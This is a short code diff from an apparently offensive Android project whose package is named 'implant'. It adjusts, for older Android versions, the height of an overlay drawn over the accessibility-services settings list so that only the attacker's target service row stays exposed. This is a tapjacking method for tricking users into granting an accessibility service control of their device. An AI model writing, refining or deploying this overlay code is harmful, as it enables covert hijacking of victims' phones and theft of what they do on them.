@@ -3,6 +3,7 @@ package com.cooperthecoder.implant
 import android.content.Context
 import android.graphics.Color
 import android.graphics.PixelFormat
+import android.os.Build
 import android.support.constraint.ConstraintLayout
 import android.view.Gravity
 import android.view.WindowManager
@@ -32,7 +33,12 @@ class AccessibilityStage(context: Context, listener: () -> Unit) : Stage(context
     private fun topOverlayHeight(): Int {
         for ((index, value) in accessibilityServices.withIndex()) {
             if (value.id == targetServiceId) {
-                return (index * Screen.listViewItemHeight(context)) + (2 * Screen.actionBarHeight(context))
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    return (index * Screen.listViewItemHeight(context)) + (2 * Screen.actionBarHeight(context))
+                } else {
+                    // Slightly higher on pre-M devices
+                    return ((index * Screen.listViewItemHeight(context)) + (1.5 * Screen.actionBarHeight(context))).toInt()
+                }
             }
         }
         throw IllegalStateException("No accessibility service configured. Try setting Config.ACCESSIBILITY_SERVICE_CLASS to your AccessibilityService.")
